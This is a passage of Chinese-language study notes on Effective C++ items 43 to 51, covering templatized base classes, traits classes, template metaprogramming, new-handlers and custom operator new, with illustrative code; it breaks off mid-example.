title="条款 43：学习处理模板化基类内的名称"></a>条款 43：学习处理模板化基类内的名称</h3><p><strong>C++ 拒绝在 derived class template 中识别 base class template 中的成员函数</strong>：因为编译器会觉得 base class template 有可能被特化，而那个特化版本可能不提供和一般性 template 相同的接口。因此它往往拒绝在 templatized base classes 内寻找继承而来的名称。三种解决方法（相当于用户对编译器做出的承诺）：</p><ul><li>在 base class 的函数调用动作之前加上 **”this-&gt;”**。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Company&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggingMsgSender</span> :</span> <span class="keyword">public</span> MsgSender&lt;Company&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendClearMsg</span><span class="params">(<span class="keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">this</span>-&gt;<span class="built_in">sendClear</span>(info) <span class="comment">// 假设sendClear是基类模板中定义的函数</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>使用 using 声明式。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Company&gt;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LoggingMsgSender</span> :</span> <span class="keyword">public</span> MsgSender&lt;Company&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sendClearMsg</span><span class="params">(<span class="keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">using</span> MsgSender&lt;Company&gt;::sendClear;</span><br><span class="line">    <span class="keyword">this</span>-&gt;<span class="built_in">sendClear</span>(info) <span class="comment">// 假设sendClear是基类模板中定义的函数</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></li><li>明确的指出被调用的函数位于 base class 内。（无法使用多态！！）  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Company&gt;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LoggingMsgSender</span> :</span> <span class="keyword">public</span> MsgSender&lt;Company&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sendClearMsg</span><span class="params">(<span class="keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">using</span> MsgSender&lt;Company&gt;::sendClear;</span><br><span class="line">    MsgSender&lt;Company&gt;::<span class="built_in">sendClear</span>(info) <span class="comment">// 假设sendClear是基类模板中定义的函数</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="条款-44：将与参数无关的代码抽离-template"><a href="#条款-44：将与参数无关的代码抽离-template" class="headerlink" title="条款 44：将与参数无关的代码抽离 template"></a>条款 44：将与参数无关的代码抽离 template</h3><ul><li><p>因非类型模板参数（non-type template parameter）而造成的代码膨胀，往往可以消除，做法是以<strong>函数参数</strong>或 <strong>class 成员变量</strong>替换 template 参数。</p></li><li><p>因类型模板参数（type template parameter）而造成的代码膨胀，往往可以降低，做法是让带有完全相同二进制表述的实例化类型<strong>共享实现码</strong>。如：在大多数平台上，指针类型往往都有相同的二进制表述，因此凡 template 持有指针者（如 <code>vector&lt;int *&gt;</code>，<code>vector&lt;const int*&gt;</code>、<code>vector&lt;float *&gt;</code>）往往应该对每一个成员函数使用唯一一份底层实现，即令他们调用另一个操作无类型指针（即 void*）的函数。</p></li></ul><hr><h3 id="条款-45：运用成员函数模板接受所有兼容类型"><a href="#条款-45：运用成员函数模板接受所有兼容类型" class="headerlink" title="条款 45：运用成员函数模板接受所有兼容类型"></a>条款 45：运用成员函数模板接受所有兼容类型</h3><ul><li>请使用成员函数模板生成 “可接受所有兼容类型” 的函数。</li><li>如果你声明 member template 用于 “泛化 copy 构造” 或 “泛化 assignment 操作”，你还是需要声明正常的  copy 构造函数和 copy assignment 操作符，因为 “泛化” 的并不会阻止编译器生成默认的版本！</li></ul><p>示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shared_ptr</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">shared_ptr</span>(<span class="keyword">const</span> shared_ptr &amp; r);<span class="comment">//copy构造函数</span></span><br><span class="line">shared_ptr&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> shared_ptr&amp; r);<span class="comment">// copy assignment</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">template</span>&lt;class U&gt;</span></span><br><span class="line"><span class="function">    <span class="title">shared_ptr</span><span class="params">(<span class="keyword">const</span> shared_ptr&lt;U&gt; &amp;r)</span></span>;<span class="comment">//泛化copy构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">U</span>&gt;</span></span><br><span class="line">    shared_ptr&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> shared_ptr&lt;U&gt;&amp; r);<span class="comment">// 泛化 copy assignment</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-46：需要类型转换时请为模板定义非成员函数"><a href="#条款-46：需要类型转换时请为模板定义非成员函数" class="headerlink" title="条款 46：需要类型转换时请为模板定义非成员函数"></a>条款 46：需要类型转换时请为模板定义非成员函数</h3><p>当我们编写一个 class template，如果它所提供的 “与此 template 相关的” 函数支持 “所有参数都可能发生隐式类型转换” 时，请将那些函数定义为 “class template” 内部的 friend 函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rational</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">const</span> Rational <span class="keyword">operator</span>*(<span class="keyword">const</span> Rational&amp; lhs, <span class="keyword">const</span> Rational&amp; rhs) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Rational</span>(lhs.<span class="built_in">numerator</span>() * rhs.<span class="built_in">numerator</span>(),</span><br><span class="line">                       lhs.<span class="built_in">denominator</span>() * rhs.<span class="built_in">denominator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这项技术一个有趣的点在于，我们虽然使用了 friend，却与 friend 的传统用途 “访问 class 的 non-public 成分” 毫不相干。为了让类型转换可能发生在所有的实参上，我们需要一个 non-member 函数；为了令这个函数自动具现化，我们需要将其声明在 class 内部；而在 class 内部声明 non-member 函数的唯一办法是：<strong>令它成为一个 friend</strong>。而将其定义在 class 内部的原因的是：<strong>如果以函数模板的方式定义在外部，则会导致链接失败，因为我们自己声明了一个函数，就有责任定义它</strong>。</p><hr><h3 id="条款-47：请使用-traits-classes-表现类型信息"><a href="#条款-47：请使用-traits-classes-表现类型信息" class="headerlink" title="条款 47：请使用 traits classes 表现类型信息"></a>条款 47：请使用 traits classes 表现类型信息</h3><p>STL 中 5 种迭代器的分类：</p><ul><li>input 迭代器：只能向前移动，一次一步，只可以读其所指向的东西，如 <strong>istream_iterator</strong>。</li><li>output 迭代器：只能向前移动，一次一步，只可以写其所指向的东西，如 <strong>ostream_iterator</strong>。</li><li>forward 迭代器：只能向前移动，可读可写多次，如 forward list 中的迭代器。</li><li>bidirectional 迭代器：除了可以向前移动，还可以向后移动。如 set、multiset、map 和 multimap 中的迭代器。</li><li>random access 迭代器：在常量时间内向前或向后跳跃任意距离。如 vector、deque 和 string 提供的迭代器。</li></ul><p>假设要为五种迭代器实现以下的 advance 模板函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">advance</span><span class="params">(IterT&amp; Iter, DistT d)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.先为五种迭代器提供专属的tag struct</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input_iterator_tag</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">output_iterator_tag</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">forward_iterator_tag</span> :</span> <span class="keyword">public</span> input_iterator_tag &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bidirectional_iterator_tag</span> :</span> <span class="keyword">public</span> forward_iterator_tag &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">random_access_iterator_tag</span> :</span> <span class="keyword">public</span> bidirectional_iterator_tag &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 实现 iterator_traits，注意特化版本</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iterator_traits</span> &#123;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">typename</span> IterT::iterator_category iterator_category;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT&gt;<span class="comment">// 用来支持普通指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iterator_traits</span>&lt;</span>IterT*&gt; &#123;</span><br><span class="line">    <span class="keyword">typedef</span> random_access_iterator_tag iterator_category;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.实现一组重载函数模板，根据不同的iterator类型实现相应功能</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doAdvance</span><span class="params">(IterT &amp;iter, DistT d ,random_access_iterator_tag)</span> </span>&#123;</span><br><span class="line">    iter += d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doAdvance</span><span class="params">(IterT &amp;iter, DistT d ,bidirectional_iterator_tag)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d &gt;= <span class="number">0</span>) &#123; <span class="keyword">while</span> (d--) ++iter; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">while</span> (d++) --iter; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doAdvance</span><span class="params">(IterT &amp;iter, DistT d ,input_iterator_tag)</span> </span>&#123;<span class="comment">//  forward_iterator_tag 也可用这个</span></span><br><span class="line">    <span class="keyword">if</span> (d &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> std::<span class="built_in">out_of_range</span>(<span class="string">&quot;Negative distance&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (d--) ++iter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doAdvance</span><span class="params">(IterT &amp;iter, DistT d ,output_iterator_tag)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> std::<span class="built_in">out_of_range</span>(<span class="string">&quot;Negative distance&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (d--) ++iter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.实现Advance函数，根据迭代器类型自动推倒出其所属类型信息，调用相应的doAdvance</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Advance</span><span class="params">(IterT &amp;iter, DistT d)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">doAdvance</span>(iter, d, <span class="keyword">typename</span> iterator_traits&lt;IterT&gt;::<span class="built_in">iterator_category</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.使用</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyIterator</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> random_access_iterator_tag iterator_category;<span class="comment">// 注意要指定该迭代器所属于的类型</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">int</span> point_diff;</span><br><span class="line"></span><br><span class="line">    MyIterator&amp; <span class="keyword">operator</span>+=(point_diff dif)&#123;</span><br><span class="line">        ptr += dif;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T *ptr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>trait 哲学：在编译期间取得某些类型信息。</strong></p><p>设计并实现一个 trait class：</p><ol><li>确认若干你希望将来可以取得的类型相关信息（tag struct）。例如对于迭代器而言，希望取得其分类。</li><li>为该信息选择一个名称（例如 iterator_category）。</li><li>提供一个 template 和一组特化版本（如 iterator_traits），内含你希望支持的类型相关信息。</li></ol><p>如何使用一个 trait classes：</p><ol><li>建立一组重载函数（劳工函数）或函数模板，彼此间的差异只在于各自的 trait 参数。另每个函数实现与其接受的 trait 信息相应和。</li><li>建立一个控制函数（工头函数）或函数模板，它调用上述的劳工函数并传递 trait class 所提供的信息。</li></ol><hr><h3 id="条款-48：认识-template-元编程"><a href="#条款-48：认识-template-元编程" class="headerlink" title="条款 48：认识 template 元编程"></a>条款 48：认识 template 元编程</h3><p>模板元编程（TMP）：以 C++ 写成，执行于 C++ 编译器内的程序，已经被证明是一个 “图灵完全” 的机器。</p><p>以 Factorial 示范 TMP：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">unsigned</span> n&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Factorial</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> value = n * Factorial&lt;n<span class="number">-1</span>&gt;::value &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Factorial</span>&lt;</span><span class="number">0</span>&gt; &#123;<span class="comment">//特化模板表示边界</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> value = <span class="number">1</span> &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有没有 TMP 的调试器？？？？？？？？？？？？？？</p><hr><h3 id="条款-49：了解-new-handler-的行为"><a href="#条款-49：了解-new-handler-的行为" class="headerlink" title="条款 49：了解 new-handler 的行为"></a>条款 49：了解 new-handler 的行为</h3><p>当 operator new 无法满足某一内存分配需求时，其会抛出异常，调用异常处理函数 new-handler。通过 <code>set_new_handler</code> 来指定该异常处理函数，那是声明于 <new> 的一个标准程序库函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> std &#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*new_handler)</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">new_handler <span class="title">set_new_handler</span><span class="params">(new_handler p)</span> <span class="title">throw</span><span class="params">()</span></span>;<span class="comment">// 返回值是该函数调用前的那个new-handler函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设计良好的 new-handler 函数必须做以下事情：</p><ul><li>让更多内存可被使用。</li><li>安装另一个 new-handler。</li><li>卸除 new-handler。将 null 指针传给 set_new_handler，一旦没有安装任何 new-handler，operator new 在内存分配失败时抛出异常。</li><li>抛出 bad_alloc 的异常。这样的异常不会被 operator new 捕捉，因此会被传播到内存索求处。</li></ul><p>自己指定专属于某个 class 的 new-handler：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewHandlerHolder</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">NewHandlerHolder</span><span class="params">(std::new_handler nh)</span> : oldHandler(nh) &#123;</span>&#125;</span><br><span class="line">    ~<span class="built_in">NewHandlerHolder</span>() &#123;</span><br><span class="line">        std::<span class="built_in">set_new_handler</span>(oldHandler);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::new_handler oldHandler;</span><br><span class="line">    <span class="built_in">NewHandlerHolder</span>(<span class="keyword">const</span> NewHandlerHolder&amp;);</span><br><span class="line">    NewHandlerHolder &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> NewHandlerHolder&amp;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 以下实现可以使的class Widget设定自己new-handler，默认为nullptr</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> std::new_handler <span class="title">set_new_handler</span><span class="params">(std::new_handler p)</span> <span class="title">throw</span><span class="params">()</span></span>;    <span class="comment">// 用户应该调用该函数为Widget指定new-handler</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> std::new_handler currentHandler;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::new_handler Widget::currentHandler = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="function">std::new_handler <span class="title">Widget::set_new_handler</span><span class="params">(std::new_handler p)</span> <span class="title">throw</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::new_handler oldHandler = currentHandler;</span><br><span class="line">    currentHandler = p;</span><br><span class="line">    <span class="keyword">return</span> oldHandler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *Widget::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span> </span>&#123;</span><br><span class="line">    <span class="function">NewHandlerHolder <span class="title">h</span><span class="params">(std::set_new_handler(currentHandler))</span></span>;   <span class="comment">// RAII 的方式将原有的global new-handler保存，并使其自动恢复</span></span><br><span class="line">    <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 以下将实现一个模板类</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewHandlerSupport</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> std::new_handler <span class="title">set_new_handler</span><span class="params">(std::new_handler p)</span> <span class="title">throw</span><span class="params">()</span></span>;    <span class="comment">// 用户应该调用该函数为Widget指定new-handler</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> std::new_handler currentHandler;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">std::new_handler </span><br><span class="line">NewHandlerSupport&lt;T&gt;::<span class="built_in">set_new_handler</span>(std::new_handler p) <span class="keyword">throw</span>() &#123;</span><br><span class="line">    std::new_handler oldHandler = currentHandler;</span><br><span class="line">    currentHandler = p;</span><br><span class="line">    <span class="keyword">return</span> oldHandler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">void</span> *NewHandlerSupport&lt;T&gt;::<span class="function"><span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span> </span>&#123;</span><br><span class="line">    <span class="function">NewHandlerHolder <span class="title">h</span><span class="params">(std::set_new_handler(currentHandler))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">std::new_handler NewHandlerSupport&lt;T&gt;::currentHandler = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget2</span> :</span> <span class="keyword">public</span> NewHandlerSupport&lt;Widget2&gt; &#123;  <span class="comment">// CRTP</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-50：了解-new-和-delete-的合理替换时机"><a href="#条款-50：了解-new-和-delete-的合理替换时机" class="headerlink" title="条款 50：了解 new 和 delete 的合理替换时机"></a>条款 50：了解 new 和 delete 的合理替换时机</h3><p>有许多的理由需要写一个自定义的 new 和 delete，包括改善性能、对 heap 运用错误进行调试、收集 heap 使用信息。</p><hr><h3 id="条款-51：编写-new-和-delete-时需固守陈规"><a href="#条款-51：编写-new-和-delete-时需固守陈规" class="headerlink" title="条款 51：编写 new 和 delete 时需固守陈规"></a>条款 51：编写 new 和 delete 时需固守陈规</h3><p>以下是 operator new 伪代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="keyword">size_t</span> size)</span> <span class="title">throw</span><span class="params">(std::bad_alloc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;<span class="comment">// 处理 0 个字节的分配请求</span></span><br><span class="line">        size = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;<span class="comment">// 直到分配失败或者排除异常</span></span><br><span class="line">        尝试分配 size bytes；</span><br><span class="line">        <span class="keyword">if</span> (分配成功)</span><br><span class="line">        <span class="keyword">return</span> (一个指针，指向分配得来的内存)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 分配失败，找出目前的new-handling函数（见下）</span></span><br><span class="line">        new_handler globalhandler = <span class="built_in">set_new_handler</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">set_new_handler</span>(globalhandler);</span><br><span 